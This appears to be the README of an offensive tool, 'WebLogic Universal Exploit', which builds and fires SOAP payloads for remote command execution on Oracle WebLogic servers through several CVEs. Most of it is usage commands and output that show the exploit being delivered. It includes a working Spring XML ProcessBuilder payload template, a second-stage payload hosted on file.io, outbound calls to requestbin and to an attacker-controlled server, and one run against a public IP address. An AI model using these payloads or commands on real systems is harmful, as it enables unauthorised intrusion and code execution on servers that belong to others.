# CVE-2019-2725
WebLogic Universal Exploit - CVE-2017-3506 / CVE-2017-10271 / CVE-2017-17485 / CVE-2019-2725 payload builder &amp; exploit 

## Info
```
$ python weblogic_exploit.py -h

========================================================================
|                      WebLogic Universal Exploit                      |
|   CVE-2017-3506 / CVE-2017-10271 / CVE-2017-17485 / CVE-2019-2725    |
|                               by pimps                               |
========================================================================

usage: weblogic_exploit.py [-h] [-pl PAYLOAD] -c CMD [-u URL] [-y YSOSERIAL]
                           [-tr TERMINAL] [-px PROXY]
                           target

positional arguments:
  target                               Target Server

optional arguments:
  -h, --help                           show this help message and exit
  -pl PAYLOAD, --payload PAYLOAD       Use one of the available payloads: [CMD
                                       - process_builder], [SERIAL -
                                       unit_of_work_change_set], [URL -
                                       fs_xml_app_ctx], [URL -
                                       fs_xml_app_ctx_old]. Default:
                                       fs_xml_app_ctx
  -c CMD, --cmd CMD                    Command to execute.
  -u URL, --url URL                    Url to fetch stage2. Used with 'URL'
                                       payloads. Default: None
  -y YSOSERIAL, --ysoserial YSOSERIAL  Custom YSOSERIAL payload file. Used
                                       with 'SERIAL' payloads. Default: None
  -tr TERMINAL, --terminal TERMINAL    Use one of the available terminals
                                       {none, bash, cmd, powershell}. Default:
                                       bash
  -px PROXY, --proxy PROXY             Configure a proxy in the format
                                       http://127.0.0.1:8080/ (default = none)

This script will generate a valid WebLogic SOAP payload to exploit different
CVE's on this web server.
```

## Usage Examples

With the SERIAL payloads, you can pass in a cmd (to dinamically generate a ysoserial payload) or manually generate a ysoserial payload and give it to the script using the -y argument.

To dinamically generate a ysoserial payload you should download the https://github.com/pimps/ysoserial-modified/blob/master/target/ysoserial-modified.jar and place it in the same directory of this script.

The payload unit_of_work_change_set is well know to work only in weblogic 10.x versions. Examples:

```
pimps$ java -jar ysoserial-modified.jar Jdk7u21 bash 'nslookup your.server.com' > ysoserial_payload.bin
pimps$ python3 weblogic_exploit.py -y ysoserial_payload.bin -pl unit_of_work_change_set -px http://127.0.0.1:8080 https://target.server.com

========================================================================
|                      WebLogic Universal Exploit                      |
|   CVE-2017-3506 / CVE-2017-10271 / CVE-2017-17485 / CVE-2019-2725    |
|                               by pimps                               |
========================================================================

[+] YSOSERIAL payload size: 3182
[+] Weblogic SOAP payload built with success...
[+] Firing exploit now...
[+] Bomb delivered... Server responded:

HTTP/1.1 202
Connection: close
Date: Wed, 28 Aug 2019 01:39:52 GMT
Content-Length: 0

pimps$ python3 weblogic_exploit.py -c 'nslookup your.server.com' -pl unit_of_work_change_set -px http://127.0.0.1:8080 https://195.235.234.168

========================================================================
|                      WebLogic Universal Exploit                      |
|   CVE-2017-3506 / CVE-2017-10271 / CVE-2017-17485 / CVE-2019-2725    |
|                               by pimps                               |
========================================================================

[+] YSOSERIAL payload size: 3027
[+] Weblogic SOAP payload built with success...
[+] Firing exploit now...
[+] Bomb delivered... Server responded:

HTTP/1.1 202
Connection: close
Date: Wed, 28 Aug 2019 01:46:33 GMT
Content-Length: 0

```

With the URL payloads (FileSystemXmlApplicationContext) you can host your own XML and pass it with the argument -u or let the exploit generate an ephemeral payload file for you and host it at https://file.io! This payload will be generated during the exploitation phase and will be deleted once the server fetches it remotely. If you want host your own payload, please use the following template for this:

```
<?xml version="1.0" encoding="utf-8"?>
<beans xmlns="http://www.springframework.org/schema/beans" 
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
  xsi:schemaLocation="http://www.springframework.org/schema/beans 
  http://www.springframework.org/schema/beans/spring-beans.xsd">
  <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
    <constructor-arg>
      <list>
        <value>bash</value>
        <value>-c</value>
        <value><![CDATA[echo "this is my bash command, change terminal if needed"]]></value>
      </list>
    </constructor-arg>
  </bean>
</beans>
```

This payload is well known to work in all versions of weblogic! The old version of this payload works only in weblogic versions not patched to the `class=` blacklist. An example in how to use this payload is described below:

```
$ python weblogic_exploit.py -tr powershell -c 'Invoke-WebRequest http://requestbin.net/r/h4x31337' -pl fs_xml_app_ctx_old -px http://127.0.0.1:8080 https://target.server.com

========================================================================
|                      WebLogic Universal Exploit                      |
|   CVE-2017-3506 / CVE-2017-10271 / CVE-2017-17485 / CVE-2019-2725    |
|                               by pimps                               |
========================================================================

[-] No stage2 URL provided... Storing it now...
[+] Stage2 payload stored with success at: https://file.io/IbCIbg
[+] Weblogic SOAP payload built with success...
[+] Firing exploit now...
[+] Bomb delivered... Server responded:

HTTP/1.1 202
Connection: close
Date: Tue, 27 Aug 2019 07:42:24 GMT
Content-Length: 0

```

And last but not least, the process_builder payload is the common exploit payload (metasploit module) that works in weblogic versions not patched to the `class=` blacklist. Example of usage:

```
pimps$ python3 weblogic_exploit.py -c 'nslookup your.server.com' -pl process_builder -px http://127.0.0.1:8080 https://target.server.com

========================================================================
|                      WebLogic Universal Exploit                      |
|   CVE-2017-3506 / CVE-2017-10271 / CVE-2017-17485 / CVE-2019-2725    |
|                               by pimps                               |
========================================================================

[+] Weblogic SOAP payload built with success...
[+] Firing exploit now...
[+] Bomb delivered... Server responded:

HTTP/1.1 202
Connection: close
Date: Wed, 28 Aug 2019 01:54:05 GMT
Content-Length: 0

```
